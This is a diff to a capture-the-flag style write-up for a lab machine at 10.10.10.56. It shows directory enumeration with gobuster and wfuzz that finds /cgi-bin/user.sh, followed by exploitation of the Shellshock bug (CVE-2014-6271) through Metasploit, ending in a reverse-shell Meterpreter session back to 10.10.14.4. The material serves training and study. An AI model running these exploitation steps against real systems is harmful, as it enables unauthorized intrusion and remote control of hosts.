@@ -38,9 +38,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 11.06 seconds
 ```
-The page itself just has a picture that doesn't really say much. Inspecting the page doesn't give any extra information either.
+The page itself just has a picture that doesn't really say much. Inspecting the page using dev tools doesn't give any extra information either.
 
-List directories of the webpage using [gobuster](https://github.com/OJ/gobuster):
+Enumerate directories of the webpage using [gobuster](https://github.com/OJ/gobuster):
 ```
 root@kali:/usr/share/wordlists# gobuster dir --url 10.10.10.56 --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt --timeout 20s
 ===============================================================
@@ -67,8 +67,6 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 
-Other gobuster commands run taking as base /cgi-bin didn't bring much.
-
 Duckduckdicking a bit noticed that the machine's name refers to the Shell Shock vulnerability (CVE-2014-6271), which is related to the `/cgi-bin` directory.
 
 Search on Metasploit:
@@ -94,30 +92,44 @@ Matching Modules
    exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     Qmail SMTP Bash Environment Variable Injection (Shellshock)
 ```
 
+`multi/http/apache_mod_cgi_bash_env_exec` is the one we were looking for. But this one needs the URI of some script that may be under `/cgi-bin`. 
+
+
+
+After several attempts with [wfuzz](https://github.com/xmendez/wfuzz), this one is good for finding `user.sh` was there:
 
 ```
-msf exploit(linux/http/ipfire_bashbug_exec) > use exploit/multi/http/apache_mod_cgi_bash_env_exec
-msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > options
-
-Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):
-
-   Name            Current Setting  Required  Description
-   ----            ---------------  --------  -----------
-   CMD_MAX_LENGTH  2048             yes       CMD max line length
-   CVE             CVE-2014-6271    yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
-   HEADER          User-Agent       yes       HTTP header to use
-   METHOD          GET              yes       HTTP method to use
-   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
-   RHOST                            yes       The target address
-   RPATH           /bin             yes       Target PATH for binaries used by the CmdStager
-   RPORT           80               yes       The target port (TCP)
-   SRVHOST         0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
-   SRVPORT         8080             yes       The local port to listen on.
-   SSL             false            no        Negotiate SSL/TLS for outgoing connections
-   SSLCert                          no        Path to a custom SSL certificate (default is randomly generated)
-   TARGETURI                        yes       Path to CGI script
-   TIMEOUT         5                yes       HTTP read response timeout (seconds)
-   URIPATH                          no        The URI to use for this exploit (default is random)
-   VHOST                            no        HTTP server virtual host
+root@kali:~# wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt  http://10.10.10.56/cgi-bin/FUZZ.sh
 ```
 
+Now we got the script it's possible to exploit the vulnerability. These are the final options set:
+```
+   Name            Current Setting                     Required  Description
+   ----            ---------------                     --------  -----------
+   CMD_MAX_LENGTH  2048                                yes       CMD max line length
+   CVE             CVE-2014-6271                       yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
+   HEADER          User-Agent                          yes       HTTP header to use
+   METHOD          GET                                 yes       HTTP method to use
+   Proxies                                             no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOST           10.10.10.56                         yes       The target address
+   RPATH           /bin                                yes       Target PATH for binaries used by the CmdStager
+   RPORT           80                                  yes       The target port (TCP)
+   SRVHOST         0.0.0.0                             yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT         8080                                yes       The local port to listen on.
+   SSL             false                               no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                                             no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI       http://10.10.10.56/cgi-bin/user.sh  yes       Path to CGI script
+   TIMEOUT         5                                   yes       HTTP read response timeout (seconds)
+   URIPATH                                             no        The URI to use for this exploit (default is random)
+   VHOST                                               no        HTTP server virtual host
+```
+
+And it's possible to get a shell by exploiting it:
+```bash
+msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.4:4444
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (861480 bytes) to 10.10.10.56
+[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.56:57908) at 2020-05-24 07:35:52 -0400
+```
